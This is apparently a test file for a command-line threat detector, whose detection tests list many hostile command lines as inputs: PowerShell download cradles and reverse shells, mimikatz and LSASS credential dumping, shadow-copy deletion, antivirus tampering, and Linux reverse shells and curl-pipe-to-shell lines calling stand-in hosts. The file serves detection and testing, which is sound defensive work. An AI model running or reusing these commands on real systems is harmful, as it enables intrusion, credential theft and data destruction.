"""Tests for aegis.core.cmdline: executable extraction and command-line detection."""

import pytest

from aegis.core import cmdline as cl
from aegis.core.models import Severity


def ids(cmd):
    return {h[0] for h in cl.analyse_command_line(cmd)}


# --------------------------------------------------------------------------- extract_executable

@pytest.mark.parametrize("cmd,expected", [
    (r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --no-startup-window',
     r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
    (r"C:\Program Files\x\y.exe -arg", r"C:\Program Files\x\y.exe"),
    (r"C:\Windows\system32\svchost.exe -k netsvcs -p", r"C:\Windows\system32\svchost.exe"),
    (r"%SystemRoot%\system32\svchost.exe -k x", r"C:\Windows\system32\svchost.exe"),
    (r"\SystemRoot\System32\smss.exe", r"C:\Windows\System32\smss.exe"),
    (r"\??\C:\Windows\system32\drivers\foo.sys", r"C:\Windows\system32\drivers\foo.sys"),
    (r"system32\csrss.exe ObjectDirectory=\Windows", r"C:\Windows\system32\csrss.exe"),
    (r'"C:\Program Files\x y\z.exe -a"', r"C:\Program Files\x y\z.exe"),
    (r"C:\Tools\a.exe C:\Other\b.exe", r"C:\Tools\a.exe"),
    ("/usr/bin/java -jar /tmp/x.jar", "/usr/bin/java"),
    ("/usr/bin/python3 /opt/app/server.py --port 8080", "/usr/bin/python3"),
    ("  ", None),
    ("", None),
])
def test_extract_executable(cmd, expected):
    assert cl.extract_executable(cmd) == expected


def test_extract_expands_env(monkeypatch):
    monkeypatch.setenv("TEMP", r"C:\Users\bob\AppData\Local\Temp")
    assert cl.extract_executable(r"%TEMP%\evil.exe /s") == r"C:\Users\bob\AppData\Local\Temp\evil.exe"
    assert cl.extract_executable(r"%ProgramFiles%\Foo\foo.exe") == r"C:\Program Files\Foo\foo.exe"


@pytest.mark.parametrize("cmd,expected", [
    (r"rundll32.exe C:\Users\a b\AppData\Local\Temp\x.dll,Entry arg", r"C:\Users\a b\AppData\Local\Temp\x.dll"),
    (r'"C:\Windows\System32\rundll32.exe" shell32.dll,Control_RunDLL x.cpl', "shell32.dll"),
    (r'rundll32.exe "C:\Program Files\x\y.dll",Entry', r"C:\Program Files\x\y.dll"),
    (r"rundll32 /d C:\x\y.dll,Run", r"C:\x\y.dll"),
    (r'rundll32 javascript:"\..\mshtml,RunHTMLApplication "', "rundll32"),
    (r"regsvr32 /s /i:http://evil/x.sct scrobj.dll", "scrobj.dll"),
    (r'regsvr32.exe /s "C:\Program Files\x\y.dll"', r"C:\Program Files\x\y.dll"),
    (r"regsvr32 /s C:\Program Files\x\y.dll", r"C:\Program Files\x\y.dll"),
    (r"regsvr32 /s http://evil/a.sct", "regsvr32"),
])
def test_extract_dll_hosts(cmd, expected):
    assert cl.extract_executable(cmd) == expected


def test_script_target():
    assert cl.script_target(r'wscript.exe //B //nologo "C:\Users\a\Downloads\x.vbs" arg') == r"C:\Users\a\Downloads\x.vbs"
    assert cl.script_target(r"powershell -NoProfile -File C:\Scripts\backup.ps1") == r"C:\Scripts\backup.ps1"
    assert cl.script_target(r'cmd.exe /c "C:\Scripts\run.bat" /x') == r"C:\Scripts\run.bat"
    assert cl.script_target("/usr/bin/python3 /opt/a.py -x") == "/opt/a.py"
    assert cl.script_target("java -jar /opt/app.jar") == "/opt/app.jar"
    assert cl.script_target(r"mshta http://evil/a.hta") is None
    assert cl.script_target(r"notepad.exe C:\x.txt") is None


def test_split_command_line():
    assert cl.split_command_line(r'a "b c" d\e  "" f') == ["a", "b c", r"d\e", "", "f"]


def test_first_program_name():
    assert cl.first_program_name(r'"C:\Windows\System32\WScript.exe" x.vbs') == "wscript"
    assert cl.first_program_name("/usr/bin/bash -c ls") == "bash"


# --------------------------------------------------------------------------- path risk

@pytest.mark.parametrize("path,risk", [
    (r"C:\Users\bob\AppData\Local\Temp\x.exe", 2),
    (r"C:\Users\bob\Downloads\setup.exe", 2),
    (r"C:\Users\Public\a.exe", 2),
    (r"C:\ProgramData\evil.exe", 2),
    (r"C:\Users\bob\AppData\Roaming\foo.exe", 2),
    (r"C:\Users\bob\AppData\Roaming\foo\bar.exe", 1),
    (r"C:\Users\bob\AppData\Local\Discord\app-1.0\Discord.exe", 0),
    (r"C:\Users\bob\AppData\Local\Programs\Foo\foo.exe", 0),
    (r"C:\Users\bob\AppData\Local\Microsoft\OneDrive\OneDrive.exe", 0),
    (r"C:\Windows\System32\cmd.exe", 0),
    (r"C:\Program Files\Foo\foo.exe", 0),
    ("/tmp/x", 2),
    ("/dev/shm/.x", 2),
    ("/usr/bin/ls", 0),
    ("/home/bob/.cache/x/y", 1),
])
def test_path_risk(path, risk):
    assert cl.path_risk(path) == risk


def test_windows_dir_helpers():
    assert cl.is_in_windir(r"C:\Windows\System32\cmd.exe")
    assert cl.is_in_system32(r"\SystemRoot\System32\smss.exe")
    assert not cl.is_in_system32(r"C:\Windows\explorer.exe")
    assert cl.is_in_program_files(r"C:\Program Files (x86)\Foo\a.exe")


# --------------------------------------------------------------------------- detection

BAD = [
    (r"powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA",
     "AEG-CMD-PS-ENC-STEALTH", Severity.HIGH),
    (r"powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA",
     "AEG-CMD-PS-ENC", Severity.MEDIUM),
    (r"p^o^w^e^r^s^h^e^l^l -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA",
     "AEG-CMD-PS-ENC", Severity.MEDIUM),
    (r"""powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')" """, "AEG-CMD-PS-CRADLE", Severity.HIGH),
    (r"powershell -c iwr http://evil/a.ps1 | iex", "AEG-CMD-PS-CRADLE", Severity.HIGH),
    (r"powershell -c [Convert]::FromBase64String($x);iex $y", "AEG-CMD-PS-INMEM", Severity.HIGH),
    (r"powershell -c (New-Object Net.WebClient).DownloadFile('http://x/a.exe','C:\a.exe')", "AEG-CMD-PS-DOWNLOAD", Severity.MEDIUM),
    (r"powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')", "AEG-CMD-PS-AMSI", Severity.HIGH),
    (r"powershell -nop -c $c=New-Object System.Net.Sockets.TCPClient('1.2.3.4',4444);$s=$c.GetStream();iex $d",
     "AEG-CMD-PS-REVSHELL", Severity.CRITICAL),
    (r"powershell Invoke-Mimikatz -DumpCreds", "AEG-CMD-PS-OFFSEC", Severity.HIGH),
    (r"mimikatz.exe sekurlsa::logonpasswords", "AEG-CMD-MIMIKATZ", Severity.CRITICAL),
    (r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\x.dmp full", "AEG-CMD-COMSVCS-DUMP", Severity.CRITICAL),
    (r"procdump.exe -ma lsass.exe l.dmp", "AEG-CMD-LSASS-DUMP", Severity.HIGH),
    (r"reg save HKLM\SAM sam.hiv", "AEG-CMD-HIVE-SAVE", Severity.HIGH),
    (r"mshta http://evil.com/a.hta", "AEG-CMD-MSHTA-REMOTE", Severity.HIGH),
    (r'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc""")', "AEG-CMD-MSHTA-REMOTE", Severity.HIGH),
    (r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1)', "AEG-CMD-RUNDLL32-SCRIPT", Severity.HIGH),
    (r"rundll32.exe", "AEG-CMD-BARE-HOST", Severity.HIGH),
    (r'"C:\Windows\System32\svchost.exe"', "AEG-CMD-BARE-HOST", Severity.HIGH),
    (r"rundll32.exe C:\Users\bob\AppData\Local\Temp\a.png,Run", "AEG-CMD-RUNDLL32-NONDLL", Severity.HIGH),
    (r"rundll32 url.dll,FileProtocolHandler C:\Users\bob\Downloads\x.exe", "AEG-CMD-RUNDLL32-URL", Severity.MEDIUM),
    (r"rundll32 shell32.dll,ShellExec_RunDLL powershell.exe -c x", "AEG-CMD-RUNDLL32-SHELLEXEC", Severity.MEDIUM),
    (r"regsvr32 /s /n /u /i:http://evil/x.sct scrobj.dll", "AEG-CMD-REGSVR32-SQUIBLEE", Severity.HIGH),
    (r"regsvr32 /s C:\Users\bob\AppData\Local\Temp\x.dll", "AEG-CMD-REGSVR32-UW", Severity.MEDIUM),
    (r"certutil -urlcache -split -f http://x/a.exe a.exe", "AEG-CMD-CERTUTIL-URL", Severity.HIGH),
    (r"certutil -decode in.b64 out.exe", "AEG-CMD-CERTUTIL-DECODE", Severity.MEDIUM),
    (r"bitsadmin /transfer j http://x/a.exe C:\a.exe", "AEG-CMD-BITSADMIN-URL", Severity.HIGH),
    (r"bitsadmin /transfer j C:\a C:\b", "AEG-CMD-BITSADMIN", Severity.MEDIUM),
    (r'wmic process call create "cmd /c calc"', "AEG-CMD-WMIC-PROCCREATE-HIGH", Severity.HIGH),
    (r"wmic process call create notepad.exe", "AEG-CMD-WMIC-PROCCREATE", Severity.MEDIUM),
    (r"wmic os get /format:http://evil/x.xsl", "AEG-CMD-WMIC-XSL", Severity.HIGH),
    (r"msiexec /i http://x/a.msi /qn", "AEG-CMD-MSIEXEC-REMOTE-QUIET", Severity.HIGH),
    (r"msiexec /i http://x/a.msi", "AEG-CMD-MSIEXEC-REMOTE", Severity.MEDIUM),
    (r"cmstp.exe /s /au C:\x\a.inf", "AEG-CMD-CMSTP", Severity.HIGH),
    (r"installutil /logfile= /LogToConsole=false /U x.exe", "AEG-CMD-INSTALLUTIL", Severity.HIGH),
    (r"regasm /U C:\Users\bob\AppData\Local\Temp\a.dll", "AEG-CMD-REGASM-UW", Severity.MEDIUM),
    (r"odbcconf /a {regsvr evil.dll}", "AEG-CMD-ODBCCONF-REGSVR", Severity.HIGH),
    (r'forfiles /p c:\windows\system32 /m notepad.exe /c "powershell -c x"', "AEG-CMD-FORFILES", Severity.MEDIUM),
    (r"conhost.exe --headless powershell -c x", "AEG-CMD-CONHOST-HEADLESS", Severity.MEDIUM),
    (r"vssadmin delete shadows /all /quiet", "AEG-CMD-RECOVERY-DESTROY", Severity.HIGH),
    (r"wbadmin delete catalog -quiet", "AEG-CMD-RECOVERY-DESTROY", Severity.HIGH),
    (r"bcdedit /set {default} recoveryenabled No", "AEG-CMD-RECOVERY-DESTROY", Severity.HIGH),
    (r"wmic shadowcopy delete", "AEG-CMD-RECOVERY-DESTROY", Severity.HIGH),
    (r"net user bob P@ss1 /add", "AEG-CMD-NET-USER-ADD", Severity.MEDIUM),
    (r"net localgroup administrators bob /add", "AEG-CMD-NET-USER-ADMIN", Severity.HIGH),
    (r'schtasks /create /tn x /tr "C:\Users\bob\AppData\Local\Temp\a.exe" /sc onlogon', "AEG-CMD-SCHTASKS-UW", Severity.MEDIUM),
    (r'schtasks /create /tn x /tr "mshta http://evil/a.hta" /sc minute', "AEG-CMD-SCHTASKS-HIGH", Severity.HIGH),
    (r"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d C:\Users\bob\AppData\Roaming\x.exe",
     "AEG-CMD-REG-RUN-HIGH", Severity.HIGH),
    (r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v x /d "C:\Program Files\x.exe"', "AEG-CMD-REG-RUN", Severity.MEDIUM),
    (r'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /d cmd.exe',
     "AEG-CMD-REG-IFEO", Severity.HIGH),
    (r"wevtutil cl Security", "AEG-CMD-EVENTLOG-CLEAR-CORE", Severity.HIGH),
    (r"wevtutil cl Application", "AEG-CMD-EVENTLOG-CLEAR", Severity.MEDIUM),
    (r"Set-MpPreference -DisableRealtimeMonitoring $true", "AEG-CMD-DEFENDER-TAMPER", Severity.HIGH),
    (r"Add-MpPreference -ExclusionPath C:\Users", "AEG-CMD-DEFENDER-TAMPER", Severity.HIGH),
    (r"sc config WinDefend start= disabled", "AEG-CMD-SECURITY-SERVICE-STOP", Severity.HIGH),
    (r"taskkill /f /im MsMpEng.exe", "AEG-CMD-AV-KILL", Severity.HIGH),
    (r"wscript.exe C:\Users\bob\Downloads\invoice.vbs", "AEG-CMD-SCRIPTHOST-UW", Severity.MEDIUM),
    (r"cscript //E:jscript C:\x\notes.txt", "AEG-CMD-SCRIPTHOST-ENGINE", Severity.MEDIUM),
    (r"xmrig -o stratum+tcp://pool.example:3333 -u wallet", "AEG-CMD-MINER", Severity.HIGH),
    # Linux
    ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "AEG-CMD-LINUX-REVSHELL", Severity.CRITICAL),
    ("nc -e /bin/sh 10.0.0.1 4444", "AEG-CMD-LINUX-NC-EXEC", Severity.HIGH),
    ("ncat --exec /bin/bash 10.0.0.1 4444", "AEG-CMD-LINUX-NC-EXEC", Severity.HIGH),
    ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f", "AEG-CMD-LINUX-REVSHELL", Severity.CRITICAL),
    ("python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('1.2.3.4',4444));os.dup2(s.fileno(),0)\"",
     "AEG-CMD-LINUX-SCRIPT-REVSHELL", Severity.HIGH),
    ("echo aGVsbG8= | base64 -d | bash", "AEG-CMD-LINUX-B64-SHELL", Severity.HIGH),
    ("curl http://1.2.3.4/x.sh | sh", "AEG-CMD-LINUX-CURL-PIPE-SUSP", Severity.HIGH),
    ("wget -qO- http://evil.ngrok.io/a | bash", "AEG-CMD-LINUX-CURL-PIPE-SUSP", Severity.HIGH),
    ("curl https://example.com/install.sh | sh -s -- -y", "AEG-CMD-LINUX-CURL-PIPE", Severity.MEDIUM),
    ("curl http://x/a.sh -o /tmp/a; chmod +x /tmp/a; /tmp/a", "AEG-CMD-LINUX-DROP-EXEC", Severity.HIGH),
    ("(crontab -l; echo '* * * * * curl http://x/a|sh') | crontab -", "AEG-CMD-LINUX-CRON-INJECT", Severity.HIGH),
    ("export LD_PRELOAD=/tmp/evil.so", "AEG-CMD-LINUX-LDPRELOAD", Severity.HIGH),
]


@pytest.mark.parametrize("cmd,rule,sev", BAD)
def test_detects(cmd, rule, sev):
    hits = {h[0]: h for h in cl.analyse_command_line(cmd)}
    assert rule in hits, f"{rule} not in {sorted(hits)} for {cmd!r}"
    assert hits[rule][2] == sev
    assert hits[rule][3], "MITRE ids missing"
    assert hits[rule][4], "matched snippet missing"


GOOD = [
    r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --no-startup-window',
    r"svchost -k netsvcs -p",
    r"C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p",
    r"powershell.exe -NoProfile -File C:\Scripts\backup.ps1",
    r'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Program Files\HP\task.ps1"',
    r"powershell -NoLogo -Command \"Get-Process | Sort CPU\"",
    r"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Get-Service",
    r'forfiles /p C:\logs /m *.log /d -30 /c "cmd /c del @path"',
    "curl -fsSL https://example.com/file.tar.gz -o file.tar.gz",
    r"msiexec /i C:\setup\app.msi /qn",
    r'"C:\Windows\System32\rundll32.exe" shell32.dll,Control_RunDLL desk.cpl',
    r"rundll32.exe printui.dll,PrintUIEntry /in /n\\server\printer",
    r"rundll32.exe url.dll,FileProtocolHandler https://example.com",
    r'cmd.exe /c "dir C:\"',
    r"reg add HKCU\Software\Foo /v Bar /d 1",
    "python3 /opt/app/server.py --port 8080",
    "/usr/bin/java -jar /opt/app.jar",
    "bash -c \"timeout 1 bash -c '</dev/tcp/localhost/22'\"",
    "wmic process list brief",
    "wmic /format:list os get caption",
    "net user",
    "net localgroup administrators",
    r'schtasks /create /tn Backup /tr "C:\Program Files\Backup\run.exe" /sc daily',
    r"certutil -hashfile C:\x.iso SHA256",
    r"bitsadmin /list",
    r"vssadmin list shadows",
    r"wevtutil qe System /c:5",
    r"taskkill /f /im notepad.exe",
    r"sc query WinDefend",
    r'"C:\Program Files\Windows Defender\MsMpEng.exe"',
    r"C:\Windows\System32\wbem\WmiPrvSE.exe -secured -Embedding",
    r"C:\Windows\system32\wscript.exe C:\Scripts\logon.vbs",
    r"Set-MpPreference -DisableRealtimeMonitoring $false",
    "git clone https://github.com/x/y && cd y && make",
    "nc -zv 10.0.0.1 22",
    "/usr/lib/systemd/systemd-journald",
    "sshd: bob@pts/0",
    "",
    "x",
]


@pytest.mark.parametrize("cmd", GOOD)
def test_benign_not_flagged(cmd):
    hits = [h for h in cl.analyse_command_line(cmd) if h[2] >= Severity.MEDIUM]
    assert hits == [], f"false positive: {[h[0] for h in hits]} for {cmd!r}"


def test_results_sorted_and_superseded():
    hits = cl.analyse_command_line(r"powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA")
    assert [h[0] for h in hits] == ["AEG-CMD-PS-ENC-STEALTH"]  # plain PS-ENC is superseded
    mixed = cl.analyse_command_line(r"cmd /c vssadmin delete shadows /all /quiet & net user a b /add")
    sevs = [int(h[2]) for h in mixed]
    assert sevs == sorted(sevs, reverse=True)
    assert cl.max_severity(mixed) == Severity.HIGH
    assert cl.max_severity([]) == Severity.INFO


def test_long_input_is_bounded():
    big = "powershell " + "A" * 200000
    assert cl.analyse_command_line(big) == []  # no catastrophic backtracking / crash


def test_bare_host_requires_path_boundary():
    """Real-Windows CI regression: .NET's SMSvcHost.exe is not svchost.exe."""
    from aegis.core.cmdline import analyse_command_line

    def bare(c):
        return any(r[0] == "AEG-CMD-BARE-HOST" for r in analyse_command_line(c))

    assert not bare(r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe")
    assert bare(r"C:\Windows\System32\rundll32.exe")
    assert bare('"C:\\Windows\\system32\\svchost.exe"')
    assert bare("rundll32.exe")
